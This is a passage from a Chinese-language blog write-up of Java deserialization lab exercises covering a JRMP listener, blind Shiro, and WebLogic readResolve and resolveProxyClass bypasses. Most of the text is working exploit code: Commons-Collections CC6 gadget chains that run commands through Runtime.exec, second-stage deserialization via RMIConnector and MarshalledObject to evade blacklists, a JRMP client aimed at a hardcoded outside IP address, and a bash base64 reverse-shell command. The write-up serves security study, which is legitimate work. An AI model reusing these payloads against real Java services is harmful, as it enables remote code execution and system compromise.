class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JrmpListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// 对象标识符</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;82.156.2.166&quot;</span>,<span class="number">2444</span>); <span class="comment">// 与远程的RMI服务连接</span></span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>)); <span class="comment">// \</span></span><br><span class="line">        RemoteObjectInvocationHandler rih = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        Registry registry = (Registry) Proxy.newProxyInstance(JrmpListener.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, rih); <span class="comment">// 通过动态代理实例化Registry接口</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        os.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        os.writeInt(<span class="number">1896</span>);</span><br><span class="line">        os.writeObject(registry);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vps上利用yso开JRMP服务，并用CC6生成命令</p>
<p><img src="https://img-blog.csdnimg.cn/7a9e20d640fe4a9f908dec7651cb3524.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/2f5ebfc5e2bc4d9b9cc9544730ba516f.png" alt="Untitled"></p>
<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/da6a61818ca3442da72a4a9cebc24f4a.png" alt="Untitled"></p>
<p>问题：</p>
<ol>
<li>每打一次payload都要重启环境，不然没有用</li>
<li>不知道为什么不能反弹shell</li>
</ol>
<h2 id="Lab4-shiro-blind"><a href="#Lab4-shiro-blind" class="headerlink" title="Lab4-shiro-blind"></a>Lab4-shiro-blind</h2><p>在docker-compose.yml中被设置了不可出网，导致上面的JRMP不可利用，但是这里反序列化还是进行了重写，说明还是不可以利用非java原生类也就是不能使用存在Transforme数组的链子。不可出网+不能使用数组说明最好还是需要利用二次反序列化绕过</p>
<h3 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h3><p><code>findRMIServerJRMP</code> 方法中会对传进去的base64字符串进行解码并进行二次反序列化，实现我们的二次反序列化进行RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="keyword">boolean</span> isIiop)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized =base64ToByteArray(base64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ClassLoader loader = EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> ObjectInputStream oin =</span><br><span class="line">            (loader == <span class="keyword">null</span>) ?</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStream(bin) :</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStreamWithLoader(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在构造函数的注释上可以知道我需要构造的payload为，其中<code>encoded-stub</code> 就是base64编码之后的CC6payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">service:jmx:rmi:<span class="comment">//[host[:port]]/stub/encoded-stub</span></span><br></pre></td></tr></table></figure>

<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>gadget:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect()</span><br><span class="line">	connect(Map&lt;String,?&gt; environment)</span><br><span class="line">			findRMIServer(JMXServiceURL directoryURL,Map&lt;String, Object&gt; environment)</span><br><span class="line">				findRMIServerJRMP(String base64, Map&lt;String, ?&gt; env, boolean isIiop)</span><br></pre></td></tr></table></figure>

<p>exp:（以cc6为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fakeTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fakeTrans );</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">        outMap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        RMIConnector rmiConnector = <span class="keyword">new</span> RMIConnector(<span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://127.0.0.1:12345/stub/&quot;</span>+Base64.getEncoder().encodeToString(bytes)), <span class="keyword">null</span>);</span><br><span class="line">        rmiConnector.connect();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h3><p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fakeTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;touch /tmp/ameuu&quot;</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fakeTrans);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        RMIConnector rmiConnector = <span class="keyword">new</span> RMIConnector(<span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://127.0.0.1:12345/stub/&quot;</span>+Base64.getEncoder().encodeToString(bytes)), <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Transformer invoke = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Map map1 = LazyMap.decorate(map, invoke);</span><br><span class="line">        TiedMapEntry tiedMapEntry1 = <span class="keyword">new</span> TiedMapEntry(map1, rmiConnector);</span><br><span class="line">        Map exp1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp1.put(tiedMapEntry1, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        map1.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        Field field1 = InvokerTransformer.class.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field1.set(invoke, <span class="string">&quot;connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream b = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream o = <span class="keyword">new</span> ObjectOutputStream(b);</span><br><span class="line">        o.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        o.writeInt(<span class="number">1896</span>);</span><br><span class="line">        o.writeObject(exp1);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(b.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/02dcd7f2a417483694d7aec850daede0.png" alt="Untitled"></p>
<p>反弹shell：</p>
<p><img src="https://img-blog.csdnimg.cn/4c4d5d7bcae5461ca6a47490a0553272.png" alt="Untitled"></p>
<h2 id="Lab5-weblogic-readResolve"><a href="#Lab5-weblogic-readResolve" class="headerlink" title="Lab5-weblogic-readResolve"></a>Lab5-weblogic-readResolve</h2><p>比lab4多了两个黑名单，这使得初次反序列化的时候不能用到相应的方法，而我们可以发现<code>InvokerTransformer</code> 和<code>ConstantTransformer</code> 等类都不可以使用，所以lab4利用的exp是不能利用了，但是还是需要二次反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">blackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">blackList.add(<span class="string">&quot;java.rmi.server&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以发现存在类<code>MarshalledObject</code> ，其方法<code>readResolve</code> 实现了没有任何限制的反序列化，所以只要我们对这个类进行反序列化并且能够调用到该方法就可以实现二次反序列化RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MarshalledObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.bytes);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简析readResolve的调用过程"><a href="#简析readResolve的调用过程" class="headerlink" title="简析readResolve的调用过程"></a>简析<code>readResolve</code>的调用过程</h3><p><code>Test</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Main</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> Test());</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bis = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接反序列化之后可以发现<code>Test#readResolve</code> 自动被调用了，简单跟进一下就会发现在反序列化的时候如果类中存在<code>readResolve</code> 就会直接调用</p>
<p><img src="https://img-blog.csdnimg.cn/21ba29048f1b49ae8b5f4de43d4f68e8.png" alt="Untitled"></p>
<p>因为<code>readResolve</code> 不需要再利用<code>InvokerTransformer</code> 等类去实现调用，所以可以直接构造exp</p>
<p>exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object o,String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] trueTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, trueTrans);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject();</span><br><span class="line">setField(marshalledObject, <span class="string">&quot;bytes&quot;</span>, bytes);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos1 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos1 = <span class="keyword">new</span> ObjectOutputStream(bos1);</span><br><span class="line">        oos1.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        oos1.writeInt(<span class="number">1896</span>);</span><br><span class="line">        oos1.writeObject(marshalledObject);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos1.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize for test</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bis = new ByteArrayInputStream(bos1.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/131e9b69ce2a47ba9e9e7145155981f6.png" alt="Untitled"></p>
<h2 id="Lab6-weblogic-resolveProxyClass"><a href="#Lab6-weblogic-resolveProxyClass" class="headerlink" title="Lab6-weblogic-resolveProxyClass"></a>Lab6-weblogic-resolveProxyClass</h2><p>有黑名单过滤，但是没有像lab4一样直接不能出网，但是也不能用lab5的exp，因为过滤了<code>org.apache.commons.collections.functors</code> 导致不能用CC链子，但是回到lab3，发现还是可能可以利用的，只不过不能用<code>java.rmi.registry.Registry</code> 了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classBlackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">proxyBlackList.add(<span class="string">&quot;java.rmi.registry&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>而我们利用到的RemoteObjectInvocationHandler实现了Remote接口，而Registry也实现了Remote接口，那么找一下还有什么接口可以利用，发现如下：</p>
<p><img src="https://img-blog.csdnimg.cn/1d4303b553be4188941382b8402cb14c.png" alt="Untitled"></p>
<p>那么直接修改一下lab3的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationInstantiator;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationMonitor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationSystem;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.Activator;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span 